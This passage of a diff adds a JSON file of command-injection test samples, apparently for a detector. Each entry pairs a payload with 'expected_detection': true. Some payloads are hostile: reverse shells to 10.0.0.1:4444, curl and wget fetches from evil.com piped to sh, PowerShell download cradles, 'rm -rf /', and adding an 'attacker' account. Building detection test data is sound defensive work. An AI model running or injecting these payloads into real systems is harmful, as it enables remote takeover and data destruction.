+    "source_ip": "87.212.130.15",
+    "timestamp": "2026-03-13T21:13:50.763885"
+  },
+  {
+    "id": "cmdi_0126",
+    "type": "command_injection",
+    "payload": "| ps aux",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "173.175.110.196",
+    "timestamp": "2026-03-13T20:47:10.763891"
+  },
+  {
+    "id": "cmdi_0127",
+    "type": "command_injection",
+    "payload": "`id`",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "57.15.81.181",
+    "timestamp": "2026-03-13T20:41:04.763896"
+  },
+  {
+    "id": "cmdi_0128",
+    "type": "command_injection",
+    "payload": "; bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "192.213.233.121",
+    "timestamp": "2026-03-13T21:21:28.763902"
+  },
+  {
+    "id": "cmdi_0129",
+    "type": "command_injection",
+    "payload": "; rm -rf /",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "65.37.249.28",
+    "timestamp": "2026-03-13T21:02:48.763908"
+  },
+  {
+    "id": "cmdi_0130",
+    "type": "command_injection",
+    "payload": "& net user attacker password123 /add",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "174.130.14.29",
+    "timestamp": "2026-03-13T20:39:53.763914"
+  },
+  {
+    "id": "cmdi_0131",
+    "type": "command_injection",
+    "payload": "; bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "130.80.250.221",
+    "timestamp": "2026-03-13T21:20:20.763919"
+  },
+  {
+    "id": "cmdi_0132",
+    "type": "command_injection",
+    "payload": "| ps aux",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "68.252.79.84",
+    "timestamp": "2026-03-13T21:15:06.763925"
+  },
+  {
+    "id": "cmdi_0133",
+    "type": "command_injection",
+    "payload": "; curl http://evil.com/backdoor | sh",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "21.30.76.211",
+    "timestamp": "2026-03-13T21:04:30.763931"
+  },
+  {
+    "id": "cmdi_0134",
+    "type": "command_injection",
+    "payload": "& net user attacker password123 /add",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "212.132.27.48",
+    "timestamp": "2026-03-13T21:03:03.763937"
+  },
+  {
+    "id": "cmdi_0135",
+    "type": "command_injection",
+    "payload": "| dir",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "91.209.168.230",
+    "timestamp": "2026-03-13T20:28:16.763942"
+  },
+  {
+    "id": "cmdi_0136",
+    "type": "command_injection",
+    "payload": "| cat /etc/passwd",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "48.171.3.160",
+    "timestamp": "2026-03-13T20:29:09.763948"
+  },
+  {
+    "id": "cmdi_0137",
+    "type": "command_injection",
+    "payload": "& net user attacker password123 /add",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "135.24.184.66",
+    "timestamp": "2026-03-13T21:18:04.763957"
+  },
+  {
+    "id": "cmdi_0138",
+    "type": "command_injection",
+    "payload": "| ls -la",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "194.60.110.85",
+    "timestamp": "2026-03-13T20:57:45.763963"
+  },
+  {
+    "id": "cmdi_0139",
+    "type": "command_injection",
+    "payload": "| ps aux",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "37.32.130.77",
+    "timestamp": "2026-03-13T21:15:13.763969"
+  },
+  {
+    "id": "cmdi_0140",
+    "type": "command_injection",
+    "payload": "& dir",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "221.238.141.175",
+    "timestamp": "2026-03-13T21:12:54.763975"
+  },
+  {
+    "id": "cmdi_0141",
+    "type": "command_injection",
+    "payload": "| nc -e /bin/sh 10.0.0.1 4444",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "78.212.77.113",
+    "timestamp": "2026-03-13T20:38:18.763980"
+  },
+  {
+    "id": "cmdi_0142",
+    "type": "command_injection",
+    "payload": "| cat /etc/passwd",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "130.228.37.43",
+    "timestamp": "2026-03-13T21:05:42.763986"
+  },
+  {
+    "id": "cmdi_0143",
+    "type": "command_injection",
+    "payload": "$(ls -la)",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "190.83.247.113",
+    "timestamp": "2026-03-13T21:17:29.763994"
+  },
+  {
+    "id": "cmdi_0144",
+    "type": "command_injection",
+    "payload": "`ls -la`",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "197.136.68.227",
+    "timestamp": "2026-03-13T20:27:34.764000"
+  },
+  {
+    "id": "cmdi_0145",
+    "type": "command_injection",
+    "payload": "; uname -a",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "128.79.229.38",
+    "timestamp": "2026-03-13T20:59:40.764005"
+  },
+  {
+    "id": "cmdi_0146",
+    "type": "command_injection",
+    "payload": "$(ls -la)",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "203.140.57.119",
+    "timestamp": "2026-03-13T21:20:20.764011"
+  },
+  {
+    "id": "cmdi_0147",
+    "type": "command_injection",
+    "payload": "; $(echo bHMgLWxh | base64 -d)",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "85.189.177.147",
+    "timestamp": "2026-03-13T20:49:29.764017"
+  },
+  {
+    "id": "cmdi_0148",
+    "type": "command_injection",
+    "payload": "$(ls -la)",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "209.212.95.230",
+    "timestamp": "2026-03-13T20:38:33.764022"
+  },
+  {
+    "id": "cmdi_0149",
+    "type": "command_injection",
+    "payload": "| dir",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "100.59.228.180",
+    "timestamp": "2026-03-13T21:01:50.764028"
+  },
+  {
+    "id": "cmdi_0150",
+    "type": "command_injection",
+    "payload": "&& ls -la",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "43.83.165.248",
+    "timestamp": "2026-03-13T20:48:44.764035"
+  },
+  {
+    "id": "cmdi_0151",
+    "type": "command_injection",
+    "payload": "; python -c 'import socket...'",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "172.162.28.157",
+    "timestamp": "2026-03-13T20:56:35.764044"
+  },
+  {
+    "id": "cmdi_0152",
+    "type": "command_injection",
+    "payload": "`id`",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "57.148.249.139",
+    "timestamp": "2026-03-13T20:30:16.764050"
+  },
+  {
+    "id": "cmdi_0153",
+    "type": "command_injection",
+    "payload": "| whoami",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "61.41.139.124",
+    "timestamp": "2026-03-13T20:55:53.764056"
+  },
+  {
+    "id": "cmdi_0154",
+    "type": "command_injection",
+    "payload": "; $(echo bHMgLWxh | base64 -d)",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "207.6.111.126",
+    "timestamp": "2026-03-13T20:52:33.764062"
+  },
+  {
+    "id": "cmdi_0155",
+    "type": "command_injection",
+    "payload": "; ls -la",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "216.97.66.160",
+    "timestamp": "2026-03-13T20:50:00.764067"
+  },
+  {
+    "id": "cmdi_0156",
+    "type": "command_injection",
+    "payload": "; whoami",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "6.250.171.110",
+    "timestamp": "2026-03-13T21:16:37.764074"
+  },
+  {
+    "id": "cmdi_0157",
+    "type": "command_injection",
+    "payload": "$(ls -la)",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "125.174.62.179",
+    "timestamp": "2026-03-13T20:32:34.764082"
+  },
+  {
+    "id": "cmdi_0158",
+    "type": "command_injection",
+    "payload": "| cat /etc/passwd",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "167.159.136.160",
+    "timestamp": "2026-03-13T20:26:12.764090"
+  },
+  {
+    "id": "cmdi_0159",
+    "type": "command_injection",
+    "payload": "| ifconfig",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "114.134.155.26",
+    "timestamp": "2026-03-13T21:14:36.764096"
+  },
+  {
+    "id": "cmdi_0160",
+    "type": "command_injection",
+    "payload": "& dir",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "49.173.252.100",
+    "timestamp": "2026-03-13T20:45:38.764101"
+  },
+  {
+    "id": "cmdi_0161",
+    "type": "command_injection",
+    "payload": "; wget http://evil.com/malware.sh",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "220.41.30.138",
+    "timestamp": "2026-03-13T20:41:53.764107"
+  },
+  {
+    "id": "cmdi_0162",
+    "type": "command_injection",
+    "payload": "| netstat -an",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "127.119.135.188",
+    "timestamp": "2026-03-13T20:37:58.764115"
+  },
+  {
+    "id": "cmdi_0163",
+    "type": "command_injection",
+    "payload": "| whoami",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "40.253.218.215",
+    "timestamp": "2026-03-13T21:07:04.764121"
+  },
+  {
+    "id": "cmdi_0164",
+    "type": "command_injection",
+    "payload": "| cat /etc/passwd",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "102.97.202.168",
+    "timestamp": "2026-03-13T20:56:30.764127"
+  },
+  {
+    "id": "cmdi_0165",
+    "type": "command_injection",
+    "payload": ";%20ls%20-la",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "15.246.44.48",
+    "timestamp": "2026-03-13T21:09:44.764132"
+  },
+  {
+    "id": "cmdi_0166",
+    "type": "command_injection",
+    "payload": "&& ls -la",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "207.188.38.20",
+    "timestamp": "2026-03-13T20:52:34.764138"
+  },
+  {
+    "id": "cmdi_0167",
+    "type": "command_injection",
+    "payload": "& powershell -c \"IEX(New-Object Net.WebClient)...\"",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "73.192.136.136",
+    "timestamp": "2026-03-13T20:51:53.764144"
+  },
+  {
+    "id": "cmdi_0168",
+    "type": "command_injection",
+    "payload": "; ifconfig",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "74.226.254.234",
+    "timestamp": "2026-03-13T20:47:17.764150"
+  },
+  {
+    "id": "cmdi_0169",
+    "type": "command_injection",
+    "payload": "| rm -rf /*",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "142.197.59.239",
+    "timestamp": "2026-03-13T20:50:06.764157"
+  },
+  {
+    "id": "cmdi_0170",
+    "type": "command_injection",
+    "payload": "; uname -a",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "222.70.185.197",
+    "timestamp": "2026-03-13T21:00:48.764164"
+  },
+  {
+    "id": "cmdi_0171",
+    "type": "command_injection",
+    "payload": "`id`",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "136.61.201.141",
+    "timestamp": "2026-03-13T20:28:08.764170"
+  },
+  {
+    "id": "cmdi_0172",
+    "type": "command_injection",
+    "payload": "| id",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "106.188.43.30",
+    "timestamp": "2026-03-13T20:48:26.764176"
+  },
+  {
+    "id": "cmdi_0173",
+    "type": "command_injection",
+    "payload": "; ls -la",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "14.213.70.129",
+    "timestamp": "2026-03-13T20:38:21.764182"
+  },
+  {
+    "id": "cmdi_0174",
+    "type": "command_injection",
+    "payload": "& powershell -c \"IEX(New-Object Net.WebClient)...\"",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "138.142.142.115",
+    "timestamp": "2026-03-13T21:13:11.764188"
+  },
+  {
+    "id": "cmdi_0175",
+    "type": "command_injection",
+    "payload": "; id",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "37.166.89.167",
+    "timestamp": "2026-03-13T21:04:38.764194"
+  },
+  {
+    "id": "cmdi_0176",
+    "type": "command_injection",
+    "payload": "| netstat -an",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "12.114.16.71",
+    "timestamp": "2026-03-13T20:35:30.764199"
+  },
+  {
+    "id": "cmdi_0177",
+    "type": "command_injection",
+    "payload": "$(ls -la)",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "183.70.58.201",
+    "timestamp": "2026-03-13T20:53:51.764205"
+  },
+  {
+    "id": "cmdi_0178",
+    "type": "command_injection",
+    "payload": "|| ls -la",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "110.171.22.66",
+    "timestamp": "2026-03-13T20:55:52.764211"
+  },
+  {
+    "id": "cmdi_0179",
+    "type": "command_injection",
+    "payload": "; whoami",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "58.14.51.15",
+    "timestamp": "2026-03-13T20:26:44.764219"
+  },
+  {
+    "id": "cmdi_0180",
+    "type": "command_injection",
+    "payload": "; netstat -an",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "43.168.238.184",
+    "timestamp": "2026-03-13T20:57:11.764225"
+  },
+  {
+    "id": "cmdi_0181",
+    "type": "command_injection",
+    "payload": "| uname -a",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "144.157.158.113",
+    "timestamp": "2026-03-13T20:48:34.764231"
+  },
+  {
+    "id": "cmdi_0182",
+    "type": "command_injection",
+    "payload": "; curl http://evil.com/backdoor | sh",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "185.249.166.157",
+    "timestamp": "2026-03-13T20:29:12.764241"
+  },
+  {
+    "id": "cmdi_0183",
+    "type": "command_injection",
+    "payload": "& dir",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "99.13.238.69",
+    "timestamp": "2026-03-13T21:21:11.764248"
+  },
+  {
+    "id": "cmdi_0184",
+    "type": "command_injection",
+    "payload": "& powershell -c \"IEX(New-Object Net.WebClient)...\"",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "70.151.168.80",
+    "timestamp": "2026-03-13T21:14:16.764254"
+  },
+  {
+    "id": "cmdi_0185",
+    "type": "command_injection",
+    "payload": "| nc -e /bin/sh 10.0.0.1 4444",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "96.69.249.109",
+    "timestamp": "2026-03-13T20:52:34.764259"
+  },
+  {
+    "id": "cmdi_0186",
+    "type": "command_injection",
+    "payload": "& ls -la",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "68.204.32.191",
+    "timestamp": "2026-03-13T20:57:24.764265"
+  },
+  {
+    "id": "cmdi_0187",
+    "type": "command_injection",
+    "payload": "| ifconfig",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "212.19.4.128",
+    "timestamp": "2026-03-13T20:56:28.764272"
+  },
+  {
+    "id": "cmdi_0188",
+    "type": "command_injection",
+    "payload": "| id",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "158.196.74.8",
+    "timestamp": "2026-03-13T21:10:09.764279"
+  },
+  {
+    "id": "cmdi_0189",
+    "type": "command_injection",
+    "payload": "; bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "80.92.134.80",
+    "timestamp": "2026-03-13T21:22:23.764285"
+  },
+  {
+    "id": "cmdi_0190",
+    "type": "command_injection",
+    "payload": "& dir",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "65.95.54.251",
+    "timestamp": "2026-03-13T21:10:10.764291"
+  },
+  {
+    "id": "cmdi_0191",
+    "type": "command_injection",
+    "payload": "; id",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "127.19.104.117",
+    "timestamp": "2026-03-13T20:41:21.764298"
+  },
+  {
+    "id": "cmdi_0192",
+    "type": "command_injection",
+    "payload": "| ifconfig",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "46.225.189.235",
+    "timestamp": "2026-03-13T21:18:20.764307"
+  },
+  {
+    "id": "cmdi_0193",
+    "type": "command_injection",
+    "payload": "; id",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "59.163.149.174",
+    "timestamp": "2026-03-13T20:58:54.764315"
+  },
+  {
+    "id": "cmdi_0194",
+    "type": "command_injection",
+    "payload": "| dir",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "75.132.50.138",
+    "timestamp": "2026-03-13T21:01:35.764324"
+  },
+  {
+    "id": "cmdi_0195",
+    "type": "command_injection",
+    "payload": "$(ls -la)",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "46.152.26.80",
+    "timestamp": "2026-03-13T20:42:43.764332"
+  },
+  {
+    "id": "cmdi_0196",
+    "type": "command_injection",
+    "payload": "; $(echo bHMgLWxh | base64 -d)",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "83.148.185.197",
+    "timestamp": "2026-03-13T20:51:15.764338"
+  },
+  {
+    "id": "cmdi_0197",
+    "type": "command_injection",
+    "payload": "| uname -a",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "192.12.229.221",
+    "timestamp": "2026-03-13T21:17:42.764344"
+  },
+  {
+    "id": "cmdi_0198",
+    "type": "command_injection",
+    "payload": "; ps aux",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "84.81.254.19",
+    "timestamp": "2026-03-13T20:58:54.764350"
+  },
+  {
+    "id": "cmdi_0199",
+    "type": "command_injection",
+    "payload": "|| ls -la",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "106.110.179.30",
+    "timestamp": "2026-03-13T20:40:43.764357"
+  }
+]
